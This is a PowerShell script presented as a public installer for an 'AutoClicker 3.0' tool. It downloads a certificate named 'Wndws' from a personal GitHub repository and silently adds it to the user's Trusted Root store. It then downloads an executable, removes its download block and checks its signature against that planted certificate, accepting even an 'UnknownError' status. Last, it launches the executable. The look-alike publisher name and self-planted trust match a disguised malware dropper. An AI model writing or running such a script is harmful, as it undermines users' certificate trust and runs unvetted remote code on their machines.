# AutoClicker 3.0 public installer — download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1

param(
    [switch]$SkipLaunch,
    [string]$InstallDir
)

$ErrorActionPreference = 'Stop'

$script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
$script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
$script:CerUrl = "$script:BaseUrl/Wndws.cer"
$script:ExeName = 'AutoClicker-3.0.exe'
$script:PublisherSubject = 'CN=Wndws'

function Get-DownloadsDirectory {
    $candidates = @(
        (Join-Path $env:USERPROFILE 'Downloads')
    )

    if ($env:OneDrive) {
        $candidates += Join-Path $env:OneDrive 'Downloads'
    }

    $profile = [Environment]::GetFolderPath('UserProfile')
    if ($profile) {
        $candidates += Join-Path $profile 'Downloads'
    }

    foreach ($path in ($candidates | Select-Object -Unique)) {
        if (-not [string]::IsNullOrWhiteSpace($path) -and (Test-Path -LiteralPath $path)) {
            return $path
        }
    }

    $fallback = Join-Path $env:USERPROFILE 'Downloads'
    if (-not (Test-Path -LiteralPath $fallback)) {
        New-Item -ItemType Directory -Force -Path $fallback | Out-Null
    }
    return $fallback
}

if ([string]::IsNullOrWhiteSpace($InstallDir)) {
    $InstallDir = Get-DownloadsDirectory
}

function Write-Step {
    param(
        [string]$Message,
        [string]$Color = 'Cyan'
    )
    Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
}

function Ensure-InstallDirectory {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Force -Path $Path | Out-Null
    }
}

function Get-TrustedWndwsRootCert {
    Get-ChildItem Cert:\CurrentUser\Root -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1
}

function Install-WndwsTrustedRoot {
    param([string]$CerPath)

    $existing = Get-TrustedWndwsRootCert
    if ($existing) {
        Write-Step 'Wndws publisher certificate already trusted.' 'Green'
        return $existing
    }

    Write-Step 'Installing Wndws publisher certificate...'
    $imported = Import-Certificate -FilePath $CerPath -CertStoreLocation Cert:\CurrentUser\Root
    Write-Step 'Wndws certificate added to Trusted Root (Current User).' 'Green'
    return $imported
}

function Test-WndwsSignedExecutable {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Executable not found: $Path"
    }

    $signature = Get-AuthenticodeSignature -FilePath $Path
    $signer = $signature.SignerCertificate

    if (-not $signer) {
        throw 'AutoClicker-3.0.exe is not Authenticode signed.'
    }

    if ($signer.Subject -ne $script:PublisherSubject) {
        throw "Unexpected signer: $($signer.Subject) (expected $script:PublisherSubject)"
    }

    if ($signature.Status -notin @('Valid', 'UnknownError')) {
        throw "Signature check failed: $($signature.Status)"
    }

    return $signature
}

function Save-Download {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$Destination,
        [int]$MinBytes = 0
    )

    Write-Step "Downloading $(Split-Path -Leaf $Destination)..."
    Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing

    if ($MinBytes -gt 0 -and (Get-Item -LiteralPath $Destination).Length -lt $MinBytes) {
        throw "Download looks too small or corrupt: $Destination"
    }
}

Write-Host ''
Write-Host '  AutoClicker 3.0 — Public Installer' -ForegroundColor White
Write-Host ''

Ensure-InstallDirectory -Path $InstallDir

$cerPath = Join-Path $env:TEMP 'Wndws.cer'
$exePath = Join-Path $InstallDir $script:ExeName

Save-Download -Url $script:CerUrl -Destination $cerPath
Install-WndwsTrustedRoot -CerPath $cerPath

Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536
Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue

$signature = Test-WndwsSignedExecutable -Path $exePath
Write-Step "Verified: signed by $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
Write-Step "Saved to Downloads: $exePath" 'Green'

if (-not $SkipLaunch) {
    Write-Step 'Launching AutoClicker 3.0...' 'Cyan'
    Start-Process -FilePath $exePath -WorkingDirectory $InstallDir
}

Write-Host ''
Write-Host '  Done.' -ForegroundColor Green
Write-Host ''
